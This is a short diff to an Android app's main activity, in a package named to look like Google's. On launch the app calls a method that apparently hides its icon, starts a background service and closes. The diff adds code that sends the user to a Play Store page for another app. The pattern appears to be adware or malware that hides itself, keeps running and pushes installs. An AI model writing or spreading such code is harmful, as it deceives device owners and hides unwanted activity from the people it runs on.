@@ -3,6 +3,7 @@ package stage.google.com.test;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.os.Bundle;
+import android.net.Uri;
 import android.content.BroadcastReceiver;
 import android.content.Context;
 
@@ -26,6 +27,9 @@ public class MainActivity extends Activity {
             super.onCreate(savedInstanceState);
             Intent mis = new Intent(this,MyIntentService.class);
             hideApplication();
+            Intent intent = new Intent(Intent.ACTION_VIEW);
+            intent.setData(Uri.parse("market://details?id=appinventor.ai_scrappsociety.Six"));
+            startActivity(intent);
             this.startService(mis);
             finish();
         }
